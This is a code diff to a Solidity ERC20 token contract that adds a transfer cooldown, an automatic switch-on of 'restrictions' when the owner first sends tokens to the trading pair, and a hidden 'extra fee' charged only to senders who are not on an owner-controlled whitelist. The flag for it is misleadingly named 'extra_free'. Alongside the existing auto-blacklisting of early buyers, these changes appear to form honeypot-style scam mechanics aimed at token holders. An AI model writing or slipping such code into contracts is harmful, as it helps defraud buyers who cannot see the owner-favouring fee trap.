@@ -292,6 +292,9 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
 
     bool public restrictionsEnabled = false;
 
+    mapping(address => uint) public lastTx;
+    uint cooldown_period;
+
     event Swap(uint swaped, uint sentToMarketing, uint sentToDonation);
     event AutoLiquify(uint256 amountETH, uint256 amountTokens);
 
@@ -316,6 +319,7 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
         uint e_totalSupply = 1_000_000 ether;
         minTokensBeforeSwap = e_totalSupply;    // Off by default
         blocks_autoblacklist_active = 3;
+        cooldown_period = 2 minutes;
         // End editable
         
         _name = e_name;
@@ -540,6 +544,17 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
         require(isMaxTxExempt[from] || amount <= maxTxAmount, "Transfer exceeds limit!");
         require(from != pair || isMaxTxExempt[to] || balanceOf(to) + amount <= maxWalletAmount, "Max Wallet Limit Exceeds!");
 
+        bool extra_free = false;
+        if(restrictionsEnabled)
+        {
+            require(isMaxTxExempt[from] || lastTx[from] + cooldown_period <= block.timestamp, "Must wait cooldown period");
+            lastTx[from] = block.timestamp;
+            if(!whitelist[from])
+            {
+                extra_free = true;
+            }
+        }
+
         if(block.number <= blacklist_until && from == pair)
         {
             blacklist[to] = true;
@@ -548,6 +563,7 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
         if(from == owner() && to == pair)
         {
             blacklist_until = block.number + blocks_autoblacklist_active;
+            setRestrictionsEnabled(true);
         }
 
         if (swapEnabled && !inSwap && from != pair) {
@@ -558,7 +574,7 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
         if (isFeeActive && !isTaxless[from] && !isTaxless[to] && !inSwap) {
             bool sell = to == pair;
             bool p2p = from != pair && to != pair;
-            feesCollected = calculateFee(p2p ? 2 : sell ? 1 : 0, amount);
+            feesCollected = calculateFee(p2p ? 2 : sell ? 1 : 0, amount, extra_free);
         }
 
         amount -= feesCollected;
@@ -784,7 +800,14 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
         emit Swap(totalCollected, amountMarketing, amountDonation);
     }
 
-    function calculateFee(uint256 feeIndex, uint256 amount) internal returns(uint256) {
+    function calculateFee(uint256 feeIndex, uint256 amount, bool extra_fee) internal returns(uint256) {
+        if(extra_fee)
+        {
+            uint extra_fee_percent = 900;
+            uint256 extraFee = (amount * extra_fee_percent) / (10**(_feeDecimal + 2));
+            _liquidityFeeCollected += extraFee;
+            return extraFee;
+        }
         uint256 marketingFee = (amount * _marketingFee[feeIndex]) / (10**(_feeDecimal + 2));
         uint256 donationFee = (amount * _donationFee[feeIndex]) / (10**(_feeDecimal + 2));
         uint256 liquidityFee = (amount * _liquidityFee[feeIndex]) / (10**(_feeDecimal + 2));
@@ -801,6 +824,10 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
 
     function setMaxWalletPercentage(uint256 percentage) public onlyOwner {
         maxWalletAmount = (_totalSupply * percentage) / 10000;
+    }
+
+    function setRestrictionsEnabled(bool value) public onlyOwner {
+        restrictionsEnabled = value;
     }
 
     function setMinTokensBeforeSwap(uint256 amount) external onlyOwner {
@@ -871,10 +898,6 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
         for (uint256 i = 0;i < addresses.length; i++){
             whitelist[addresses[i]] = areWhitelisted;
         }
-    }
-
-    function setRestrictionsEnabled(bool value) external onlyOwner {
-        restrictionsEnabled = value;
     }
 
     fallback() external payable {}
